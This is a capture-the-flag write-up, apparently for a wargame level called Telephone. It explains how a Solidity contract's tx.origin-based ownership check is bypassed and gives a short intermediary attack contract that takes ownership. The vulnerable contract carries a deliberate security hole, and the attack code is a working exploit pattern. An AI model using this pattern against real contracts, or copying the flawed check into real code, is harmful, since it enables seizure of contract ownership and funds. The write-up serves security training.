# Task

Claim ownership of the contract below to complete this level.

# Contract
 
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
What does this contract do??

1. The `owner` variable stores the address of the current owner, initially set to the address that deployed the contract (msg.sender in the constructor).

2. The `changeOwner` function can be called by anyone, but the ownership will only be transferred if `tx.origin` (the original external account initiating the transaction) is different from `msg.sender` (the immediate caller of the function).

Now, this restriction prevents a direct call from changing ownership because I tried to change  ownership directly using cast but then it didn't work; it requires a contract or intermediary to call the function on behalf of the original sender. 

Lets get the contract address and contract abi

![image](https://github.com/user-attachments/assets/c1fe8f04-847f-4879-8277-ad1196e20e8d)

First, lets check the owner of this contract

![image](https://github.com/user-attachments/assets/bf95721a-fc87-400a-9d1a-ed3cce80fe07)

That's the current owner of the contract

Below is the solve contract

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import "./telephone.sol";

contract TelephoneHack {
    Telephone telecontract;

    constructor(address _address) {
        telecontract = Telephone(_address);
    }

    function hackContract(address _address) public{ 
        telecontract.changeOwner(_address);
    }
    
}
```
This attack contract exploits the Telephone contract's ownership change condition. It calls `changeOwner` through a contract (instead of directly), which tricks the `Telephone contract` into satisfying the `tx.origin != msg.sender` check, allowing ownership to be transferred to the specified address.

Lets deploy this using forge

![image](https://github.com/user-attachments/assets/1a28c0f3-036d-4412-ae4d-fcb43f5121ba)

Since ownership can be transferred if `tx.origin != msg.sender` we can call the `hackContract` function and pass in our address


![image](https://github.com/user-attachments/assets/94f13cec-4814-49dd-a905-0cf83deb3009)

Checking the owner of the contract again

![image](https://github.com/user-attachments/assets/f7be04f3-be92-4371-b83a-bcde020e9291)

We already became the owner of the contract

You can go ahead to submit the instance

![image](https://github.com/user-attachments/assets/e95c2118-0567-4d69-aa7e-c5175c2a553c)

We have successfully completed this level

-------------------------

Till Next Time :xD






































